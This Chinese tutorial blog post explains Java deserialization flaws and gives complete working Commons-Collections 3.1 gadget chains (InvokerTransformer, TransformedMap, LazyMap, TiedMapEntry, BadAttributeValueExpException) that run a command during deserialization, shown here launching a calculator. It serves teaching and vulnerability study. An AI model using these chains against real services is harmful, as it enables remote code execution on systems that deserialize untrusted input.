---
layout: post
title:  web 安全系列-13-Serializable 序列化漏洞
date:  2020-08-09 10:37:20 +0800
categories: [web]
tags: [web, web-safe, sf]
published: true
---

# 序章

Java反序列化漏洞是近一段时间里一直被重点关注的漏洞，自从 Apache Commons-collections 爆出第一个漏洞开始，围绕着Java反序列化漏洞的事件就层出不穷，为了详细了解Java反序列化漏洞的成因和原理，

本文将以 [ysoserial](https://github.com/frohoff/ysoserial) 项目作为基础，以普通Java工程师的角度来逐步解释这类漏洞的原理。

本文涉及了大量的源码，尽可能保证开发者能够快速搭建实验环境进行漏洞的复现。

Java反序列漏洞涉及大量的Java基础，而漏洞利用过程复杂巧妙，为了清晰地表达出其中的原理，粘贴了大量的代码片段。

# 核心要点

## Java反序列化与 ObjectInputStream

在Java中,利用ObjectInputStream的readObject方法进行对象读取时，当目标对象已经重写了readObject方法，则目标对象readObject方法。

如下代码所示

```java
public class ReadObject implements Serializable {

  private void readObject(java.io.ObjectInputStream stream)
          throws IOException, ClassNotFoundException{
      System.out.println("read object in ReadObject");
  }

  public static void main(String[] args) throws IOException, ClassNotFoundException {
      byte[] serializeData=serialize(new ReadObject());
      deserialize(serializeData);
  }

  public static byte[] serialize(final Object obj) throws IOException {
      ByteArrayOutputStream out = new ByteArrayOutputStream();
      ObjectOutputStream objOut = new ObjectOutputStream(out);
      objOut.writeObject(obj);
      return out.toByteArray();
  }

  public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
       ByteArrayInputStream in = new ByteArrayInputStream(serialized);
       ObjectInputStream objIn = new ObjectInputStream(in);
       return objIn.readObject();
  }
}
```

以上代码将会输出

```
read object in ReadObject
```

可见在反序列化的过程中,如果目标对象的readObject进行了一些更复杂的操作的时候,那么极有可能给恶意代码提供可乘之机。

## 利用java的反射来执行代码

Java的反射机制提供为Java工程师的开发提供了相当多的便利性，同样也带来了潜在的安全风险。

反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态。

Java反射的四大核心是 Class，Constructor，Field，Method，如下代码所示。

我们将利用Java的反射机制来操纵代码调用本地的计算器

```java
public static void main(String[] args) throws Exception {
    Object runtime=Class.forName("java.lang.Runtime")
            .getMethod("getRuntime",new Class[]{})
            .invoke(null);

    Class.forName("java.lang.Runtime")
            .getMethod("exec", String.class)
            .invoke(runtime,"calc.exe");
}
```

以上代码中,我们利用了Java的反射机制把我们的代码意图都利用字符串的形式进行体现，使得原本应该是字符串的属性，变成了代码执行的逻辑，而这个机制也为我们后续的漏洞使用的前提。

# 从零开始

为了尽可能地将Java反序列化漏洞的原理讲述清楚，在本章节中，我们将站在一个攻击者和漏洞利用者的角度去观察如何使用Java的反序列化漏洞。

## 环境

要完成实验需要添加如下版本的库

```xml
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-collections4</artifactId>
  <version>4.0</version>
</dependency>
<dependency>
  <groupId>commons-collections</groupId>
  <artifactId>commons-collections</artifactId>
  <version>3.1</version>
</dependency>
<!-- 用于修改字节码-->
<dependency>
  <groupId>org.javassist</groupId>
  <artifactId>javassist</artifactId>
  <version>3.22.0-GA</version>
</dependency>
```

## 靶子

在进行攻击之前,我们需要模拟出一个靶子，靶子代码如下，其主要功能是监听本地端口，并将端口中的数据进行反序列化。

```java
public static void main(String[] args) throws IOException {
    ServerSocket server = new ServerSocket(10000);
    while (true) {
        Socket socket = server.accept();
        execute(socket);
    }
}

public static void execute(final Socket socket){
    new Thread(new Runnable() {
        public void run() {
            try {
                ObjectInputStream is  = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));
                Object obj = is.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }).start();
}
```

然而为了更加容易的测试，我们可以将上述的过程描绘为

构造一个恶意的Java对象将这个对象序列化到一个 byte数组从这个byte数组利用反序列化还原对象如果在反序列化的过程中执行了恶意对象的代码，视为漏洞利用成功

因此我们可以将测试的代码简化如下

```java
public static void main(String[] args) throws Exception {
    deserialize(serialize(getObject()));
}

//在此方法中返回恶意对象
public static Object getObject(){
    return "";
}

public static byte[] serialize(final Object obj) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    ObjectOutputStream objOut = new ObjectOutputStream(out);
    objOut.writeObject(obj);
    return out.toByteArray();
}

public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
    ByteArrayInputStream in = new ByteArrayInputStream(serialized);
    ObjectInputStream objIn = new ObjectInputStream(in);
    return objIn.readObject();
}
```

## 恶意代码

在进行攻击之前，我们将构造出一段恶意代码，该恶意代码的主要功能是运行对方电脑上的计算器

```java
public static void main(String[] args) throws IOException {
    Runtime.getRuntime().exec("calc.exe");
}
```

## 恶意代码的包装

Java的反序列化漏洞中,目前我们只能传输一个对象的属性与状态，而不是字节码，因此我们就需要使用Java的反射技术来将我们的代码意图进行掩盖，以确保我们的恶意代码能传输到目标服务器上。

为了演示出一个 "合格" 的漏洞代码，我们构建了一个Java类,代码如下所示。

一个由我们构造的满足入侵条件的Java反序列化漏洞案例

```java
public class ReflectionPlay implements Serializable{

  public static void main(String[] args) throws Exception {
      new ReflectionPlay().run();
  }

  public void run() throws Exception {
      byte[] ObjectBytes=serialize(getObject());
      deserialize(ObjectBytes);
  }

  //在此方法中返回恶意对象
  public Object getObject() {
      String command = "calc.exe";
      Object firstObject = Runtime.class;
      ReflectionObject[] reflectionChains = {
              //调用 Runtime.class 的getMethod方法,寻找 getRuntime方法，得到一个Method对象(getRuntime方法)
              //等同于 Runtime.class.getMethod("getRuntime",new Class[]{String.class,Class[].class})
              new ReflectionObject("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
              //调用 Method 的 invoker 方法可以得到一个Runtime对象
              // 等同于 method.invoke(null),静态方法不用传入对象
              new ReflectionObject("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
              //调用RunTime对象的exec方法,并将 command作为参数执行命令
              new ReflectionObject("exec", new Class[]{String.class}, new Object[]{command})
      };

      return new ReadObject(new ReflectionChains(firstObject, reflectionChains));
  }

  /*
   * 序列化对象到byte数组
   * */
  public byte[] serialize(final Object obj) throws IOException {
      ByteArrayOutputStream out = new ByteArrayOutputStream();
      ObjectOutputStream objOut = new ObjectOutputStream(out);
      objOut.writeObject(obj);
      return out.toByteArray();
  }

  /*
   * 从byte数组中反序列化对象
   * */
  public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
      ByteArrayInputStream in = new ByteArrayInputStream(serialized);
      ObjectInputStream objIn = new ObjectInputStream(in);
      return objIn.readObject();
  }

  /*
  * 一个模拟拥有漏洞的类，主要提供的功能是根据自己的属性中的值来进行反射调用
  * */
  class ReflectionObject implements Serializable{
      private String methodName;
      private Class[] paramTypes;
      private Object[] args;

      public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) {
          this.methodName = methodName;
          this.paramTypes = paramTypes;
          this.args = args;
      }

      //根据  methodName, paramTypes 来寻找对象的方法，利用 args作为参数进行调用
      public Object transform(Object input) throws Exception {
          Class inputClass = input.getClass();
          return inputClass.getMethod(methodName, paramTypes).invoke(input, args);
      }
  }

  /*
  * 一个用来模拟提供恶意代码的类,
  * 主要的功能是将 ReflectionObject进行串联调用,与ReflectionObject一起构成漏洞代码的一部分
  * */
  class ReflectionChains implements Serializable{

      private Object firstObject;
      private ReflectionObject[] reflectionObjects;

      public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) {
          this.firstObject = firstObject;
          this.reflectionObjects = reflectionObjects;
      }

      public Object execute() throws Exception {
          Object concurrentObject = firstObject;
          for (ReflectionObject reflectionObject : reflectionObjects) {
              concurrentObject = reflectionObject.transform(concurrentObject);
          }
          return concurrentObject;
      }
  }

  /**
   * 一个等待序列化的类,拥有一个属性和一个重写了的readObject方法
   * 并且在readObject方法中执行了该属性的一个方法
   * */
  class ReadObject implements Serializable {

      private ReflectionChains reflectionChains;

      public ReadObject(ReflectionChains reflectionChains) {
          this.reflectionChains = reflectionChains;
      }
      //当反序列化的时候，这个代码会被调用
      //该方法被调用的时候其属性都是空
      private void readObject(java.io.ObjectInputStream stream)
              throws IOException, ClassNotFoundException {
          try {
              //用来模拟当readObject的时候，对自身的属性进行了一些额外的操作
              reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null);
              reflectionChains.execute();
          } catch (Exception e) {
              e.printStackTrace();
          }
      }
  }
}
```

# 实施攻击的三个条件

为了实现一个攻击行为，我们需要从目标的系统中找到如下三个条件相关的类，然后将他们合理利用起来。根据漏洞利用过程我们将这三个条件比喻成三个模块以便于理解。

- 无德的病毒

无德的病毒指的是,依托Java本身的特性，将恶意代码包装到一个正常的调用流程里，使得在被触发的时候执行恶意的代码逻辑

- 无辜的宿主

无辜的宿主只的是最终被序列化的对象，无辜的原因在于该对象在实现自己的readObject方法的时候并没有意识到自身的逻辑在对自身属性进行操作的时候会被恶意代码寄生。

- 无良的媒介

无良的媒介指的是，用来将无德的病毒层层包装之后，放入宿主对象的一系列工具类，他们被创造的本意不是为了给病毒利用，而是被攻击者用来将恶意的代码包装到宿主能够接受的类型中。

现在我们将以 Commons-collections 3.1 被初次爆出反序列化漏洞的事件为例子，展示在攻击过程中需要构建的要素。

## 无德的病毒(一个可以进行序列化的恶意对象)

在利用漏洞之前，我们需要找到一个可以实现执行恶意代码的工具类，他们的作用是将我们的恶意代码伪装起来，并且在一个合理的时机里触发我们的恶意代码。

在上述我们构造的模拟漏洞中，ReflectionObject，ReflectionChains 就承担了将恶意代码包装到属性中的行为，并且可以在一个合理的时间中爆发。

在Commons-collections 3.1 的反序列化漏洞中如下的几个类就可以利用来包装我们的恶意代码。

```java
org.apache.commons.collections.Transformerorg.apache.commons.collections.functors.ChainedTransformer
org.apache.commons.collections.functors.ConstantTransforme
rorg.apache.commons.collections.functors.InvokerTransformer
```

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe",}),
};
Transformer transformerChain = new ChainedTransformer(transformers);
//测试我们的恶意对象是否可以被序列化
ByteArrayOutputStream out = new ByteArrayOutputStream();
ObjectOutputStream objOut = new ObjectOutputStream(out);
objOut.writeObject(transformerChain);
//执行以下语句就可以调用起计算器
transformerChain.transform(null);
```

利用以上的代码，我们可以看到我们的计算器被执行了，因此我们就达成了我们的第一步，构建一个可以执行恶意代码的对象

## 无辜的宿主(一个实现readObject方法且可能存在其他可利用行为的Serializable类)

在构建好一个恶意对象之后，我们需要寻找到一个readObject的突破口，如上述模拟漏洞的ReadObject一样，在序列化的过程中会做一些额外的操作，在这些操作中，一些行为可以利用，一些不可能利用，我们要找出一个可以利用的突破口来，并以此作为我们最终序列化的对象，该对象就像一个被寄生的宿主一样，最主要的目的就是被送到目标服务器中，并在反序列化的时候触发恶意代码。

### AnnotationInvocationHandler

例如在Java的低版本代码中存在如下的一个对象 

注：在高版本的1.8 JDK往后的JDK中该类的代码已经被修改，而无法使用，因此如果你需要做这个实验的话，需要安装1.8的低版本JDK，例如在1.8 u60中该代码可以被使用。

```
sun.reflect.annotation.AnnotationInvocationHandler
```

其中readObject方法如下所示

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();
    // Check to make sure that types have not evolved incompatibly
    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch (IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                    value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                                value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
            }
        }
    }
}
```

让我们把目光转移到 memberValue.setValue() 这一行函数上,从我们的模拟漏洞类中，我们可以知道，如果我们可以让memberValue.setValue()在触发的时候能够执行我们的恶意代码，那么我们的漏洞入侵就算成功了。

那么去哪里寻找媒介呢，能够让memberValue在setValue的时候执行我们之前构造好的恶意代码呢？

### BadAttributeValueExpException

如果你当前的实验版本已经不支持AnnotationInvocationHandler(高于8u66的都不支持),那么可以采用BadAttributeValueExpException,这是一个在当前版本内都能利用的对象（jdk9u4以下都有效果）。

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);
    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

BadAttributeValueExpException的readObject里有一个valObj.toString()的调用，如果我们能够让恶意对象在Object.toString()的时候被调用，那么我们就能成功的利用了

## 无良的媒介(用来构建恶意对象到触发对象的包装类)

为了让我们的恶意对象，能够成功寄身在宿主中，我们还需要一系列的转换工具和调用过程。

让我们以上文中提到的可以执行任意命令的ChainedTransformer类和readObject的时候会操作自身memberValue的AnnotationInvocationHandler类为目标，利用Commons-collections 3.1提供的工具类来进行包装。

首先我们要观察宿主AnnotationInvocationHandler

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658399397L;
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
                superInterfaces.length != 1 ||
                superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }
    /*
    * 此处省略无关代码...
    * */
    private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();
        // Check to make sure that types have not evolved incompatibly
        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }
        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                        value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                            new AnnotationTypeMismatchExceptionProxy(
                                    value.getClass() + "[" + value + "]").setMember(
                                    annotationType.members().get(name)));
                }
            }
        }
    }
}
```

我们可以看到 AnnotationInvocationHandler是一个Serializable且重写了readObject方法的类，并且在readObject方法中遍历了自身中类型为Map 的memberValues属性,并对其中的Entry对象执行setValue操作。

因此我们只需要寻找一个Map类,该类的特点是其中的Entry在SetValue的时候会执行额外的程序将这个Map类作为参数构建一个AnnotationInvocationHandler对象，并序列化

在进行包装之前，我们先来认识几个Commons-collections 3.1中的工具类

### TransformedMap

TransformedMap是Commons-collections 3.1提供的一个工具类，用来包装一个Map对象，并且在该对象的Entry的Key或者Value进行改变的时候,对该Key和Value进行Transformer提供的转换操作

```java
public class TransformedMapTest {

 public static void main(String[] args) {
     new TransformedMapTest().run();
 }

 public void run(){
     Map map=new HashMap();
     map.put("key","value");
     //调用目标对象的toString方法
     String command="calc.exe";
     final String[] execArgs = new String[] { command };
     final Transformer[] transformers = new Transformer[] {
             new ConstantTransformer(Runtime.class),
             new InvokerTransformer("getMethod", new Class[] {
                     String.class, Class[].class }, new Object[] {
                     "getRuntime", new Class[0] }),
             new InvokerTransformer("invoke", new Class[] {
                     Object.class, Object[].class }, new Object[] {
                     null, new Object[0] }),
             new InvokerTransformer("exec",
                     new Class[] { String.class }, execArgs)
     };
     Transformer transformer=new ChainedTransformer(transformers);
     Map<String, Object> transformedMap=TransformedMap.decorate(map,null,transformer);
     for (Map.Entry<String,Object> entry:transformedMap.entrySet()){
         entry.setValue("anything");
     }
 }
}
```

以上代码,就会调用起我们的计算器。由此可见，我们只需要把经过我们包装好的transformedMap对象作为AnnotationInvocationHandler的属性并序列化，我们就可以在反序列化的时候执行我们的恶意代码。

完整的代码如下(需要 jdk8u60 以下的版本)

```java
public class CommonCollectionsPlayLoad {

 public static void main(String[] args) throws Exception {
     new CommonCollectionsPlayLoad().run();
 }

 public void run() throws Exception {
     deserialize(serialize(getObject()));
 }

 //在此方法中返回恶意对象
 public Object getObject() throws Exception {
     //构建恶意代码
     String command="calc.exe";
     final String[] execArgs = new String[] { command };
     final Transformer[] transformers = new Transformer[] {
             new ConstantTransformer(Runtime.class),
             new InvokerTransformer("getMethod", new Class[] {
                     String.class, Class[].class }, new Object[] {
                     "getRuntime", new Class[0] }),
             new InvokerTransformer("invoke", new Class[] {
                     Object.class, Object[].class }, new Object[] {
                     null, new Object[0] }),
             new InvokerTransformer("exec",
                     new Class[] { String.class }, execArgs)
     };
     Transformer transformer=new ChainedTransformer(transformers);

     //将恶意代码包装到目标的 sun.reflect.annotation.AnnotationInvocationHandler 中
     /**
      * 构建一个 transformedMap ,
      * transformedMap的作用是包装一个Map对象,使得每一次在该Map中的Entry进行setValue的时候
      * 都会触发 transformer的transform()方法
      * */
     Map transformedMap=TransformedMap.decorate(new HashedMap(),null,transformer);
     //由于AnnotationInvocationHandler无法直接访问,因此使用反射的方式来构建对象
     final Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
     constructor.setAccessible(true);
     return constructor.newInstance(Override.class, transformedMap);
 }

 public byte[] serialize(final Object obj) throws IOException {
     ByteArrayOutputStream out = new ByteArrayOutputStream();
     ObjectOutputStream objOut = new ObjectOutputStream(out);
     objOut.writeObject(obj);
     return out.toByteArray();
 }

 public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
     ByteArrayInputStream in = new ByteArrayInputStream(serialized);
     ObjectInputStream objIn = new ObjectInputStream(in);
     return objIn.readObject();
 }
}
```

另一个可以使用的宿主BadAttributeValueExpException

由于在本文写作的当下,大部分的Jdk版本已经高于 8u66,因此AnnotationInvocationHandler类已经去除了setValue的方法,而导致无法使用，因此大家可以采用BadAttributeValueExpException进行实验

```java
public class BadAttributeValueExpException extends Exception   {
    /* Serial version */
    private static final long serialVersionUID = -3105272988410493376L;
    /**
     * @serial A string representation of the attribute that originated this exception.
     * for example, the string value can be the return of {@code attribute.toString()}
     */
    private Object val;
    /**
     * Constructs a BadAttributeValueExpException using the specified Object to
     * create the toString() value.
     *
     * @param val the inappropriate value.
     */
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }
    /**
     * Returns the string representing the object.
     */
    public String toString()  {
        return "BadAttributeValueException: " + val;
    }
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);
        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
}
```

BadAttributeValueExpException与AnnotationInvocationHandler利用的原理相同，但是在处理转换的工具上略有不同。接下来我们先分析BadAttributeValueExpException的突破口，以及利用该突破口的工具

### 突破口

观察BadAttributeValueExpException的readObejct方法，其中在System.getSecurityManager() == null条件满足的时候,会调用 valObj.toString(),从攻击思路上看，其他的条件都是无法满足的。

因此valObj.toString()就成为了我们的突破口。

我们要找到一个合适的工具在toString()方法被调用的时候会触发我们的恶意代码。

### 媒介工具介绍

此时媒介工具我们依然采用Commons-collections 3.1提供的类 LazyMap
 
LazyMap是Commons-collections 3.1提供的一个工具类,是Map的一个实现，主要的内容是利用工厂设计模式，在用户get一个不存在的key的时候执行一个方法来生成Key值 如下代码所示,当且仅当get行为存在的时候Value才会被生成

```java
Map targetMap=LazyMap.decorate(new HashMap(), new Transformer() {
    public Object transform(Object input) {
        return new Date();
    }
});
System.out.println(targetMap.get("anything"));
```

以上代码将会打印出当前的运行时间 大家可以看到LazyMap,可以在get动作触发的时候,执行我们的Transformer对象中的transform方法，刚好可以用来引爆我们在上面编写的恶意代码。 

然而BadAttributeValueExpException的触发点是toString(),现在我们仍然需要包装这一个LazyMap

### TiedMapEntry

TiedMapEntry也存在于Commons-collections 3.1,该类主要的作用是将一个Map 绑定到 Map.Entry 下,形成一个映射

```java
  public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {

      /** Serialization version */
      private static final long serialVersionUID = -8453869361373831205L;

      /** The map underlying the entry/iterator */
      private final Map map;
      /** The key */
      private final Object key;

      /**
       * Constructs a new entry with the given Map and key.
       *
       * @param map  the map
       * @param key  the key
       */
      public TiedMapEntry(Map map, Object key) {
          super();
          this.map = map;
          this.key = key;
      }

      /**
       * 此处省略部分无关代码....
       * */

      /**
       * Gets the value of this entry direct from the map.
       *
       * @return the value
       */
      public Object getValue() {
          return map.get(key);
      }

      /**
       * Gets a string version of the entry.
       *
       * @return entry as a string
       */
      public String toString() {
          return getKey() + "=" + getValue();
      }
  }
```

让我们看看这个类，首先是toString()中调用了getValue(),getValue()中实际是map.get(key),这样一来我们就构建起了整个调用链接了

## 使用方式

让我们从被序列化的类展开来看

```
BadAttributeValueExpException 中的属性 Object val --> TiedMapEntry
TiedMapEntry 的 toString() 方法调用了自身map属性的getValue() 方法 --> LazyMap
LazyMap的getValue拿到的必然是一个空对象,因此会触发LazyMap属性中配置的Transformer.transform()
Transformer 是我们构建的包含有恶意代码的对象
```

组合后使用的代码如下所示

```java
public class BadExceptionTest {
    public static void main(String[] args) throws Exception {
        new BadExceptionTest().run();
    }
    public void run() throws Exception {
        deserialize(serialize(getObject()));
    }
    //在此方法中返回恶意对象
    public Object getObject() throws Exception {
        //构建恶意代码
        String command="calc.exe";
        final String[] execArgs = new String[] { command };
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs)
        };
        Transformer transformer=new ChainedTransformer(transformers);
        final Map lazyMap = LazyMap.decorate(new HashMap(), transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        //利用反射的方式来向对象传参
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);
        return val;
    }
    public  byte[] serialize(final Object obj) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        return out.toByteArray();
    }
    public  Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
        ByteArrayInputStream in = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(in);
        return objIn.readObject();
    }
}
```

以上代码就在我们进行反序列化的过程中调用了我们的计算器

# 依赖

## 问题复现的依赖

```xml
<dependencies>
  <dependency>
    <groupId>junit</groupId>
    <artifactId>junit</artifactId>
    <version>4.11</version>
    <scope>test</scope>
  </dependency>
  <dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2</version>
  </dependency>
  <dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
  </dependency>
  <dependency>
    <groupId>commons-codec</groupId>
    <artifactId>commons-codec</artifactId>
    <version>1.9</version>
  </dependency>
  <dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-io</artifactId>
    <version>1.3.2</version>
  </dependency>
</dependencies>
```

# Apache common collections

Apache common collections 的反序列化利用链在15年左右爆出，由于许多框架都用到了这个库，因此也是造成了很大的影响。

## Pop链

apache common collection的整个反序列化过程主要依托于transformer类以及TransformedMap类。

Transformer类用于描述变换过程，而TransformedMap则将这个变换过程应用于一个Map上，当Map中的元素发生改变时则按照设置好的Transformer进行一系列的处理操作。

```java
Map transformedMap=TransformedMap.decorate(map,keyTrasnfomer,valueTransformer);
```

这里便是通过一个decorate函数将一个map转换为TransformedMap,并且对map的key和value绑定相应的这里便通过一个decorate函数将一个map转换为TranformedMap,并对map的key和value绑定相应的Transformer,当key和value改变时便触发对应的Transformer的transform方法进行处理动作。

如果想要实现一连串的变换操作则可以通过ChainedTransformer来实现,比如这里我们用于实现RCE的Tranformer链：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        /*
        由于Method类的invoke(Object obj,Object args[])方法的定义
        所以在反射内写new Class[] {Object.class, Object[].class }
        正常POC流程举例：
        ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
        */
        new InvokerTransformer(
                "getMethod",
                new Class[] {String.class, Class[].class },
                new Object[] {"getRuntime", new Class[0] }
        ),
        new InvokerTransformer(
                "invoke",
                new Class[] {Object.class,Object[].class },
                new Object[] {null, null }
        ),
        new InvokerTransformer(
                "exec",
                new Class[] {String.class },
                new Object[] { "/Applications/Calculator.app/Contents/MacOS/Calculator" } //目标机器上反序列化后执行的命令
        )
};
Transformer chainedTransformer=new ChainedTransformer(transformers);
```

实际执行的代码便是 `((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("/Applications/Calculator.app/Contents/MacOS/Calculator")` ,也就是Map下的弹计算器的指令。

之后我们可以构造一个使用这个chain的TransformedMap,并且触发对这个transformedMap的处理即可

```java
Map map=new HashMap();
map.put("a","b");
Map transformedMap=TransformedMap.decorate(map,null,chainedTransformer);
transformedMap.put("a","z");
```

执行成功，就可以弹出计算器。

## RCE构造

我们已经构造出了执行命令的popChain,那样怎样才能找到一个符合条件的RCE?我们需要找到一个满足下列条件的类:

重写了readObject方法在readObject方法中存在对一个可控的map进行修改的过程

之前的很多文章都是使用的AnnotationInvocationHandler类,然而最开始调试时我使用的jdk版本(1.8)中该类的readObject方法中并没有找到对map的更改操作。

后来参考反序列化自动化工具ysoserial中的CommonsCollections5这个payload实现了其中的一个调用链：利用BadAttributeValueExpException类。

我们可以看一下这个类的readObject方法：

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
}
```

可以看到这里我们对反序列化传入的对象的成员属性val判断其类型，如果这个变量不是String便会调用val的toString方法。

这里如果我们通过反序列化传入的val是一个lazyMap类的entry，在调用其toString方法时便会调用LazyMap.get()从而触发绑定的Transformer的transform方法。

但是这里我们的LazyMap类在获取一个不存在的键的时候才会触发transform，因此我们这里可以引入另外一个类TiedMapEntry,这个类在执行toString时可以调用其绑定的map取获取预定的键。

因此这个poc链的执行过程为：

```
BadAtrributeValueException对象exception  ->
exception对象的val设置为lazyMap的TiedMapEntry,键为lazyMap中不存在的键 ->
调用entry的toString() ->
调用lazyMap的get方法获取这个不存在的键 ->
调用transform方法
```

具体实现：

```java
Transformer chainedTransformer=new ChainedTransformer(transformers);
Map normalMap=new HashMap();
normalMap.put("hackedby","imagemlt");
Map lazyMap=LazyMap.decorate(normalMap,chainedTransformer);

TiedMapEntry entry=new TiedMapEntry(lazyMap,"foo");

BadAttributeValueExpException exception=new BadAttributeValueExpException(null);
Field valField=exception.getClass().getDeclaredField("val");
valField.setAccessible(true);
valField.set(exception,entry);

File f=new File("/tmp/payload.bin");
ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(exception);
out.flush();
out.close();

ObjectInputStream in=new ObjectInputStream(new FileInputStream(f));
in.readObject();
```

其实我们看这个反序列化的利用链可以联想到之前wordpress的phar 反序列化RCE的漏洞也用到了一个类似的对数组进行操作的Iterator类，所以利用一个Map的附加操作也可以作为我们挖掘此类漏洞的思路。

# Spring JNDI反序列化漏洞

众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。

